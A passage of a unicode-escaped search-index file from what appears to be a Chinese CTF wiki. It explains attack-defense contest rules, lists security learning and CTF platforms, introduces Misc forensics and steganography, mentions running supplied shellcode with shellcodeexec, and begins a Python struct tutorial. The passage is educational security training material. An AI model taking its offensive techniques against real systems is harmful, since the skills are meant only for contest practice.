\u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u6df1\u5316\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002","title":"\u8d5b\u5236\u603b\u8bc4"},{"location":"introduction/mode/#-attack-defense","text":"\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u5728\u7f51\u7edc\u7a7a\u95f4\u4e92\u76f8\u8fdb\u884c\u653b\u51fb\u548c\u9632\u5b88\uff0c\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u6765\u5f97\u5206\uff08\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u4e0d\u8bbe\u7f6e\u5f97\u5206\uff0c\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff09\u3002\u653b\u9632\u6a21\u5f0f CTF \u8d5b\u5236\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\u53ca\u4ee5\u4e0a\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002 \u63a5\u4e0b\u6765\u8bb2\u8bb2\u653b\u9632\u6a21\u5f0f\u7684\u5177\u4f53\u60c5\u51b5\uff1a \u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u7ea6\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u534a\u5c0f\u65f6\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002 \u9996\u5148\u9700\u8981\u63a5\u5165\u6bd4\u8d5b\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u4e0e\u7f51\u7ebf\u63a5\u53e3\u8f6c\u6362\u5668\uff08\u6bd4\u5982 Mac \u7535\u8111\u9700\u8981\u4f7f\u7528\uff0c\u5982\u679c\u4e3b\u529e\u65b9\u6ca1\u6709\u63d0\u4f9b\u7684\u8bdd\uff0c\u90a3\u5c31\u9700\u8981\u4f60\u81ea\u5907\u4e86\u3002\u5b58\u5728\u6b64\u95ee\u9898\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0b\uff09\u3002\u6587\u6863\u4e0a\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8fde\u63a5\u9700\u8981\u586b\u5199\u7684 IP \u5730\u5740\u3001\u7f51\u5173\u3001\u63a9\u7801\u3001DNS \u670d\u52a1\u5668\u5730\u5740 \u7528\u4e8e\u8fde\u63a5\u7f51\u7edc\u3002 \u6587\u6863\u4e0a\u4f1a\u660e\u786e\u7ed9\u51fa \u53c2\u8d5b\u961f\u4f0d\u6240\u5728 IP \u7f51\u6bb5 \u3001 \u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0 \u3001 \u5df1\u65b9 Gamebox \u7684 IP \u5730\u5740 \u3001 \u767b\u5f55\u7528\u6237\u540d\u5bc6\u7801 \u4ee5\u53ca \u654c\u65b9 Gamebox \u6240\u5728 IP \u7f51\u6bb5 \u3002 \u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002\u53c2\u8d5b\u961f\u4f0d\u4f7f\u7528\u6587\u6863\u63d0\u4f9b\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0\u548c Gamebox\u3002 \u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u822c\u6bcf\u8f6e\u5927\u7ea6\u662f 3 - 5 \u5206\u949f\u65f6\u95f4\u3002\u4f60\u9700\u8981\u5199\u811a\u672c\u81ea\u52a8\u63d0\u4ea4\u5230\u7b54\u9898\u5e73\u53f0\uff08\u624b\u52a8\u63d0\u4ea4\u4e5f\u884c\uff09\u4e0a\u5f97\u5206\u3002\u6bcf\u652f\u961f\u4f0d\u90fd\u4f1a\u6709\u4e00\u5b9a\u7684\u521d\u59cb\u5f97\u5206\uff08\u4e00\u822c\u521d\u59cb\u5f97\u5206\u76f8\u540c\uff0c\u5982\u679c\u8d5b\u524d\u4f1a\u76f8\u5e94\u8003\u6838\uff0c\u90a3\u4e48\u4f1a\u6839\u636e\u8d5b\u524d\u8003\u6838\u6210\u7ee9\u8bbe\u7f6e\u653b\u9632\u8d5b\u7684\u521d\u59cb\u5f97\u5206\uff09Gamebox \u72b6\u6001\u5206\u4e3a\u4e09\u79cd\uff0c \u6b63\u5e38\u3001\u653b\u9677\u3001\u4e0d\u53ef\u7528 \u3002Gamebox \u4e2d\u7684 flag \u4e5f\u4f1a\u6bcf\u8f6e\u8fdb\u884c\u5237\u65b0\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u6709\u88c1\u5224\u7cfb\u7edf\u6bcf\u8f6e\u90fd\u4f1a\u8fdb\u884c\u8bc4\u5b9a\u3002 \u5982\u679c\u4e00\u8f6e\u8fc7\u53bb\uff0cGamebox \u8868\u73b0\u6b63\u5e38\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u6839\u636e\u672c\u8f6e\u672a\u88ab\u653b\u9677\u7684 Gamebox \u60c5\u51b5\u7ed9\u4e88\u9632\u5fa1\u5f97\u5206 \u5982\u679c\u9632\u5fa1\u8fc7\u4e8e\u4e25\u683c\uff0c\u65e0\u6cd5\u901a\u8fc7\u88c1\u5224\u7cfb\u7edf\u7684 \u6f0f\u6d1e\u670d\u52a1\u53ef\u7528\u6027\u5224\u5b9a \u7684\u8bdd\uff0c\u8be5\u8f6e\u4f1a\u88ab\u88c1\u5224\u7cfb\u7edf\u8ba4\u5b9a\u4e3a\u8be5 Gamebox \u4e0d\u53ef\u7528\uff08\u89c6\u4e3a\u5b95\u673a\uff09\u3002\u672c\u8f6e\u76f4\u63a5\u5931\u5206\u3002 \u5982\u679c Gamebox \u88ab\u653b\u9677\uff08\u6709\u961f\u4f0d\u63d0\u4ea4\u4e86\u4f60\u4eec\u961f Gamebox \u4e0a\u968f\u673a\u751f\u6210\u7684 flag\uff09\uff0c\u90a3\u4e48\u88c1\u5224\u7cfb\u7edf\u4f1a\u7ed9\u4e88\u8be5\u961f\u653b\u51fb\u5f97\u5206\u3002 \u4e00\u8f6e\u4e0b\u6765\uff0c\u7531\u6210\u529f\u653b\u9677\u8be5 Gamebox \u7684\u961f\u4f0d\u5e73\u5206\u653b\u9677\u5f97\u5206\u3002 \u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense"},{"location":"introduction/resources/","text":"\u5728\u7ebf\u5b66\u4e60 \u00b6 i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93 \u5b66\u4e60\u8def\u7ebf \u00b6 \u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n \u4fe1\u606f\u8d44\u8baf \u00b6 FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458 \u6280\u672f\u8bba\u575b \u00b6 \u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b CTF \u8d5b\u4e8b \u00b6 XCTF\u793e\u533a CTFtime CTF Rank CTF OJ \u00b6 XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn CTF \u5de5\u5177 \u00b6 \u770b\u96ea\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus CTF Writeup \u96c6\u5408 \u00b6 CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"\u5b66\u4e60\u8d44\u6e90"},{"location":"introduction/resources/#_1","text":"i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0 \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01 \u770b\u96ea\u77e5\u8bc6\u5e93","title":"\u5728\u7ebf\u5b66\u4e60"},{"location":"introduction/resources/#_2","text":"\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1 \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26 \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n","title":"\u5b66\u4e60\u8def\u7ebf"},{"location":"introduction/resources/#_3","text":"FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2 \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53 \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168 Sec-News \u5b89\u5168\u6587\u6458","title":"\u4fe1\u606f\u8d44\u8baf"},{"location":"introduction/resources/#_4","text":"\u543e\u7231\u7834\u89e3 \u770b\u96ea\u8bba\u575b \u5148\u77e5\u793e\u533a i\u6625\u79cb\u8bba\u575b","title":"\u6280\u672f\u8bba\u575b"},{"location":"introduction/resources/#ctf","text":"XCTF\u793e\u533a CTFtime CTF Rank","title":"CTF \u8d5b\u4e8b"},{"location":"introduction/resources/#ctf-oj","text":"XCTF OJ CTF\u5927\u672c\u8425 pwnhub \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0 HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0 BugkuCTF WeChall Sniper OJ Jarvis OJ CTF Learn","title":"CTF OJ"},{"location":"introduction/resources/#ctf_1","text":"\u770b\u96ea\u5de5\u5177 CTF\u5728\u7ebf\u5de5\u5177 by CTFcode CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team ctf-tools by zardus","title":"CTF \u5de5\u5177"},{"location":"introduction/resources/#ctf-writeup","text":"CTFs Writeup \u96c6\u9526 CTF solution by p4 team","title":"CTF Writeup \u96c6\u5408"},{"location":"misc/introduction/","text":"Misc \u662f\u82f1\u6587 Miscellaneous \u7684\u524d\u56db\u4e2a\u5b57\u6bcd\uff0c\u6742\u9879\u3001\u6df7\u5408\u4f53\u3001\u5927\u6742\u70e9\u7684\u610f\u601d\u3002 Misc \u5728\u56fd\u5916\u7684\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u53c8\u88ab\u5177\u4f53\u5212\u5206\u4e3a\u5404\u4e2a\u5c0f\u5757\uff0c\u6709 Recon Forensic Stego Misc \u2026\u2026 \u5728\u56fd\u5185\u5185\u7684\u6bd4\u8d5b\u4e2d\uff0c\u88ab\u7edf\u4e00\u5212\u5206\u5165 Misc \u9886\u57df\uff0c\u6709\u65f6 Crypto\uff08\u5c24\u5176\u662f\u53e4\u5178\u5bc6\u7801\uff09\u4e5f\u88ab\u5212\u5165\u5176\u4e2d\u3002 \u5728 Misc \u8fd9\u4e00\u7ae0\u8282\u4e2d\uff0c\u5c06\u4ece\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u4ecb\u7ecd\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff1a Recon\uff08\u4fe1\u606f\u641c\u96c6\uff09 \u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e9b\u83b7\u53d6\u4fe1\u606f\u7684\u6e20\u9053\u548c\u4e00\u4e9b\u5229\u7528\u767e\u5ea6\u3001\u8c37\u6b4c\u7b49\u641c\u7d22\u5f15\u64ce\u7684\u6280\u5de7 Encode\uff08\u7f16\u7801\u8f6c\u6362\uff09 \u4e3b\u8981\u4ecb\u7ecd\u5728 CTF \u6bd4\u8d5b\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u7f16\u7801\u5f62\u5f0f\u4ee5\u53ca\u8f6c\u6362\u7684\u6280\u5de7\u548c\u5e38\u89c1\u65b9\u5f0f Forensic && Stego\uff08\u6570\u5b57\u53d6\u8bc1 && \u9690\u5199\u5206\u6790\uff09 \u9690\u5199\u53d6\u8bc1\u662f Misc \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u5757\uff0c\u5305\u62ec\u6587\u4ef6\u5206\u6790\u3001\u9690\u5199\u3001\u5185\u5b58\u955c\u50cf\u5206\u6790\u548c\u6d41\u91cf\u6293\u5305\u5206\u6790\u7b49\u7b49\uff0c\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u3001\u9690\u85cf\u6570\u636e\u3001\u5c42\u5c42\u5d4c\u5957\u7684\u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\uff0c\u7075\u6d3b\u5229\u7528\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u6240\u9700\u8981\u7684\u4fe1\u606f\u7b49\u7b49\u3002 CTF \u4e2d Misc \u4e0e\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u4e0d\u540c\uff0c\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u5f88\u5c11\u4f1a\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u52a0\u5bc6\uff0c\u6570\u636e\u9690\u85cf\uff0c\u88ab\u5206\u6563\u5d4c\u5957\u5728\u5404\u5904\u7684\u6587\u4ef6\u5b57\u7b26\u4e32\uff0c\u6216\u662f\u5176\u4ed6\u8111\u6d1e\u7c7b\u7684 Chanllenge\u3002\u5f88\u591a\u65f6\u5019\u662f\u53bb\u7cbe\u5fc3\u6062\u590d\u4e00\u4e2a\u6b8b\u635f\u7684\u6587\u4ef6\uff0c\u6316\u6398\u635f\u574f\u786c\u76d8\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9,\u6216\u8005\u4ece\u5185\u5b58\u955c\u50cf\u4e2d\u62bd\u53d6\u6709\u7528\u7684\u4fe1\u606f\u3002 \u73b0\u5b9e\u7684\u53d6\u8bc1\u9700\u8981\u4ece\u4e1a\u8005\u80fd\u591f\u627e\u51fa\u95f4\u63a5\u7684\u6076\u610f\u884c\u4e3a\u8bc1\u636e\uff1a\u653b\u51fb\u8005\u653b\u51fb\u7cfb\u7edf\u7684\u75d5\u8ff9\uff0c\u6216\u662f\u5185\u90e8\u5a01\u80c1\u884c\u4e3a\u7684\u75d5\u8ff9\u3002\u5b9e\u9645\u5de5\u4f5c\u4e2d\u8ba1\u7b97\u673a\u53d6\u8bc1\u5927\u90e8\u5206\u662f\u4ece\u65e5\u5fd7\u3001\u5185\u5b58\u3001\u6587\u4ef6\u7cfb\u7edf\u4e2d\u627e\u51fa\u72af\u7f6a\u7ebf\u7d22\uff0c\u5e76\u627e\u51fa\u4e0e\u6587\u4ef6\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6570\u636e\u7684\u5173\u7cfb\u3002\u800c\u6d41\u91cf\u53d6\u8bc1\u6bd4\u8d77\u5185\u5bb9\u6570\u636e\u7684\u5206\u6790\uff0c\u66f4\u6ce8\u91cd\u5143\u6570\u636e\u7684\u5206\u6790\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u4e0d\u540c\u7aef\u70b9\u95f4\u5e38\u7528TLS\u52a0\u5bc6\u7684\u7f51\u7edc\u4f1a\u8bdd\u3002 Misc \u662f\u5207\u5165 CTF \u7ade\u8d5b\u9886\u57df\u3001\u57f9\u517b\u5174\u8da3\u7684\u6700\u4f73\u5165\u53e3\u3002Misc \u8003\u5bdf\u57fa\u672c\u77e5\u8bc6\uff0c\u5bf9\u5b89\u5168\u6280\u80fd\u7684\u5404\u4e2a\u5c42\u9762\u90fd\u6709\u4e0d\u540c\u7a0b\u5ea6\u7684\u6d89\u53ca\uff0c\u53ef\u4ee5\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u542f\u53d1\u601d\u7ef4\u3002","title":"\u6742\u9879\u7b80\u4ecb"},{"location":"misc/others/","text":"\u7ed9\u5b9a\u4e00\u6bb5 shellcode\uff0c\u6267\u884c\u5e76\u83b7\u53d6\u7ed3\u679c\u3002 \u5de5\u5177 \u00b6 shellcodeexec \u9898\u76ee \u00b6 Jarvis OJ - Basic - shellcode","title":"\u5176\u4ed6"},{"location":"misc/others/#_1","text":"shellcodeexec","title":"\u5de5\u5177"},{"location":"misc/others/#_2","text":"Jarvis OJ - Basic - shellcode","title":"\u9898\u76ee"},{"location":"misc/prefix/","text":"\u5927\u90e8\u5206\u7684 CTF \u6bd4\u8d5b\u4e2d\uff0c\u53d6\u8bc1\u53ca\u9690\u5199\u4e24\u8005\u5bc6\u4e0d\u53ef\u5206\uff0c\u4e24\u8005\u6240\u9700\u8981\u7684\u77e5\u8bc6\u4e5f\u76f8\u8f85\u76f8\u6210\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e5f\u5c06\u5bf9\u4e24\u8005\u4e00\u8d77\u4ecb\u7ecd\u3002 \u4efb\u4f55\u8981\u6c42\u68c0\u67e5\u4e00\u4e2a\u9759\u6001\u6570\u636e\u6587\u4ef6\u4ece\u800c\u83b7\u53d6\u9690\u85cf\u4fe1\u606f\u7684\u90fd\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u9690\u5199\u53d6\u8bc1\u9898\uff08\u9664\u975e\u5355\u7eaf\u5730\u662f\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\uff09\uff0c\u4e00\u4e9b\u4f4e\u5206\u7684\u9690\u5199\u53d6\u8bc1\u53c8\u5e38\u5e38\u4e0e\u53e4\u5178\u5bc6\u7801\u5b66\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u800c\u9ad8\u5206\u7684\u9898\u76ee\u5219\u901a\u5e38\u7528\u4e0e\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u73b0\u4ee3\u5bc6\u7801\u5b66\u77e5\u8bc6\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5f88\u597d\u5730\u4f53\u73b0\u4e86 Misc \u9898\u7684\u7279\u70b9\u3002 \u524d\u7f6e\u6280\u80fd \u00b6 \u4e86\u89e3\u5e38\u89c1\u7684\u7f16\u7801 \u80fd\u591f\u5bf9\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u4e00\u4e9b\u7f16\u7801\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u4e14\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\uff08Base64\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7b49\uff09\u6709\u4e00\u5b9a\u7684\u654f\u611f\u5ea6\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5e76\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002 \u80fd\u591f\u5229\u7528\u811a\u672c\u8bed\u8a00\uff08Python \u7b49\uff09\u53bb\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e \u719f\u77e5\u5e38\u89c1\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5c24\u5176\u662f\u5404\u7c7b \u6587\u4ef6\u5934 \u3001\u534f\u8bae\u3001\u7ed3\u6784\u7b49 \u7075\u6d3b\u8fd0\u7528\u5e38\u89c1\u7684\u5de5\u5177 Python \u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e \u00b6 struct \u6a21\u5757 \u00b6 \u6709\u7684\u65f6\u5019\u9700\u8981\u7528 Python \u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6bd4\u5982\uff0c\u5b58\u53d6\u6587\u4ef6\uff0csocket \u64cd\u4f5c\u65f6\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u4f7f\u7528 Python \u7684 struct \u6a21\u5757\u6765\u5b8c\u6210\u3002 struct \u6a21\u5757\u4e2d\u6700\u91cd\u8981\u7684\u4e09\u4e2a\u51fd\u6570\u662f pack() \u3001 unpack() \u548c calcsize() pack(fmt, v1, v2, ...) \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\uff0c\u628a\u6570\u636e\u5c01\u88c5\u6210\u5b57\u7b26\u4e32\uff08\u5b9e\u9645\u4e0a\u662f\u7c7b\u4f3c\u4e8ec\u7ed3\u6784\u4f53\u7684\u5b57\u8282\u6d41\uff09 unpack(fmt, string) \u6309\u7167\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u89e3\u6790\u5b57\u8282\u6d41 string\uff0c\u8fd4\u56de\u89e3\u6790\u51fa\u6765\u7684 tuple calcsize(fmt) \u8ba1\u7b97\u7ed9\u5b9a\u7684\u683c\u5f0f\uff08fmt\uff09\u5360\u7528\u591a\u5c11\u5b57\u8282\u7684\u5185\u5b58 \u8fd9\u91cc\u6253\u5305\u683c\u5f0f fmt \u786e\u5b9a\u4e86\u5c06\u53d8\u91cf\u6309\u7167\u4ec0\u4e48\u65b9\u5f0f\u6253\u5305\u6210\u5b57\u8282\u6d41\uff0c\u5176\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u5c31\u4e0d\u518d\u7ed9\u51fa\u4e0d\u540c\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u542b\u4e49\u4e86\uff0c\u8be6\u7ec6\u7ec6\u8282\u53ef\u4ee5\u53c2\u7167 Python Doc >>> import struct >>> struct . pack ( '>I' , 16 ) ' \\x00\\x00\\x00\\x10 ' pack \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c '>I' \u7684\u610f\u601d\u662f\uff1a > \u8868\u793a\u5b57\u8282\u987a\u5e8f\u662f Big-Endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0c I \u8868\u793a 4 \u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u540e\u9762\u7684\u53c2\u6570\u4e2a\u6570\u8981\u548c\u5904\u7406\u6307\u4ee4\u4e00\u81f4\u3002 \u8bfb\u5165\u4e00\u4e2a BMP \u6587\u4ef6\u7684\u524d 30 \u5b57\u8282\uff0c\u6587\u4ef6\u5934\u7684\u7ed3\u6784\u6309\u987a\u5e8f\u5982\u4e0b \u4e24\u4e2a\u5b57\u8282\uff1a BM \u8868\u793a Windows \u4f4d\u56fe\uff0c BA \u8868\u793a OS/2 \u4f4d\u56fe \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u8868\u793a\u4f4d\u56fe\u5927\u5c0f \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u4fdd\u7559\u4f4d\uff0c\u59cb\u7ec8\u4e3a 0 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u5b9e\u9645\u56fe\u50cf\u7684\u504f\u79fb\u91cf \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1aHeader \u7684\u5b57\u8282\u6570 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u5bbd\u5ea6 \u4e00\u4e2a 4 \u5b57\u8282\u6574\u6570\uff1a\u56fe\u50cf\u9ad8\u5ea6 \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u59cb\u7ec8\u4e3a 1 \u4e00\u4e2a 2 \u5b57\u8282\u6574\u6570\uff1a\u989c\u8272\u6570 >>> import struct >>> bmp = ' 